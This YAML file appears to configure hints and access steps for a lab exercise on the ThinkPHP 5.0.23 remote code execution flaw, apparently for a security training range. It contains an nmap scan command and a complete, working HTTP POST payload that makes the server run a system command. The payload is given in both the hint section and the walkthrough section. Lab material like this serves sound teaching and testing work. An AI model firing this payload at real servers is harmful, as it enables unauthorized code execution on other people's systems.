match: thinkphp/5.0.23-rce
hint_levels:
  low:
  - Inspect the thinkphp service or application on {{NODE_NAME}} @ {{NODE_IP}}.
  medium:
  - |-
    Catalog TCP ports: 8080. Identify the exposed services:

    ```bash
    nmap -Pn -sT -sV -p 8080 {{NODE_IP}}
    ```
  - 'Catalog port mappings (published → container): web: 8080/tcp → container 80/tcp. These are recipe defaults;
    use the deployed service port if the scenario remaps it.'
  - 'Documented target URL(s): `http://{{NODE_IP}}:8080`.'
  high:
  - 'Vulnerability: ThinkPHP5 5.0.23 Remote Code Execution Vulnerability.'
  - Send the raw request examples with an HTTP client that recalculates Content-Length after target and payload
    substitutions.
  - |-
    POC

    Send the packets and execute the command `id`:

    ```
    POST /index.php?s=captcha HTTP/1.1
    Host: {{NODE_IP}}
    Accept-Encoding: gzip, deflate
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    Connection: close
    Content-Type: application/x-www-form-urlencoded

    _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
    ```

    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/thinkphp/5.0.23-rce/1.png
  - 'Publicly available documentation: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/thinkphp/5.0.23-rce/README.md'
  - |-
    Additional public references:
    - https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003
access_instructions:
  title: ThinkPHP5 5.0.23 Remote Code Execution Vulnerability
  steps:
  - title: Locate the target service
    instructions: |-
      Catalog TCP ports: 8080. Identify the exposed services:

      ```bash
      nmap -Pn -sT -sV -p 8080 {{NODE_IP}}
      ```

      Catalog port mappings (published → container): web: 8080/tcp → container 80/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.

      Documented target URL(s): `http://{{NODE_IP}}:8080`.
  - title: POC
    instructions: |-
      Send the packets and execute the command `id`:

      ```
      POST /index.php?s=captcha HTTP/1.1
      Host: {{NODE_IP}}
      Accept-Encoding: gzip, deflate
      Accept: */*
      Accept-Language: en
      User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
      Connection: close
      Content-Type: application/x-www-form-urlencoded

      _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
      ```

      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/thinkphp/5.0.23-rce/1.png
